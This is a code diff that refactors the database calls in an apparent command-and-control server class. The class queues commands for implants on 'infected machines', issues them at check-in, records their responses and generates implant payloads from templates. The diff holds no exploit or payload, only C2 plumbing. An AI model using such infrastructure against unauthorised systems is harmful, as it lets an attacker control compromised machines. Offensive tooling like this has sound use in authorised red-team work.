@@ -9,7 +9,7 @@ class ImplantSingleton:
         def AddCommand(self, User, cid, UniqueImplantKey,Command):
             # AddCommand is responsible for creating new entries for implants to pickup.
             #   User validation checks must occur before a command is registered.
-            db.Register_ImplantCommand(User, UniqueImplantKey, Command, cid=cid)
+            db.implant.Register_ImplantCommand(User, UniqueImplantKey, Command, cid=cid)
 
 
         def IssueCommand(self,UIK=0, c2_protocol=None):
@@ -17,38 +17,41 @@ class ImplantSingleton:
                 # -- Issue command based on unique implant identifiers (UIK)
                 # -- UIK is embedded into the implant via Jinja on delivery.
 
-                # Updates an implants last check-in time.
-                db.Update_ImplantLastCheckIn(UIK, c2_protocol)
 
-                ImplantObj=db.Get_GeneratedImplantDataFromUIK(UIK)
+
+                ImplantObj=db.implant.Get_GeneratedImplantDataFromUIK(UIK)
+                # Updates an implants last check-in time.
+                db.implant.Update_ImplantLastCheckIn(ImplantObj['cid'], UIK, c2_protocol)
+
                 for implant in ImplantObj:
-                    ImpLogs = db.Get_RegisteredImplantCommandsFromUIK(implant['unique_implant_id'])
+                    ImpLogs = db.implant.Get_RegisteredImplantCommandsFromUIK(ImplantObj['unique_implant_id'])
                     tmpImpLogs = []
                     for x in ImpLogs:
                         if x.read_by_implant == 0:
                             tmpImpLogs.append(x)
                     if len(tmpImpLogs) != 0:
                         Entry = min(tmpImpLogs, key=lambda x: x.time)
-                        if db.Register_ImplantCommandPickup(Entry, c2_protocol):
+                        if db.implant.Register_ImplantCommandPickup(Entry, c2_protocol):
                             return Entry.log_entry
 
             # -- Create a suitable null response.
             # --    This may be a random value, depending on how the implant handles it.
+
                 return "=="
             else:
                 return "=="
 
         # -- Used by Implant - Logs command responses from infected machines.
         def CommandResponse(self,unique_implant_key , cmd_result, c2_protocol=None):
-            generated_implant_data = db.Get_GeneratedImplantDataFromUIK(unique_implant_key)
-            db.Register_ImplantResponse(generated_implant_data[0]['cid'],unique_implant_key,cmd_result, c2_protocol)
+            generated_implant_data = db.implant.Get_GeneratedImplantDataFromUIK(unique_implant_key)
+            db.implant.Register_ImplantResponse(generated_implant_data['cid'],unique_implant_key,cmd_result, c2_protocol)
 
 
         # -- Used by webapp.
         def Get_CommandResult(self,cid):
             # -- This trust any calls have already been authenticated/
             # --    May need to move authentication to this level.
-            return db.Get_CampaignImplantResponses(cid)
+            return db.implant.Get_CampaignImplantResponses(cid)
 
         # -- Used by Implant stagers to create a suitable implant based on implant template configuration
         def GeneratePayload(self, NewSplicedImplantData):
@@ -57,7 +60,7 @@ class ImplantSingleton:
             if len(NewSplicedImplantData) == 1:
                 NewSplicedImplantData = NewSplicedImplantData[0]
             rendered_implant = ImpGen.generate_implant_from_template(NewSplicedImplantData)
-            db.Set_GeneratedImplantCopy(NewSplicedImplantData, rendered_implant)
+            db.implant.Set_GeneratedImplantCopy(NewSplicedImplantData, rendered_implant)
             return rendered_implant
 
         # TODO:
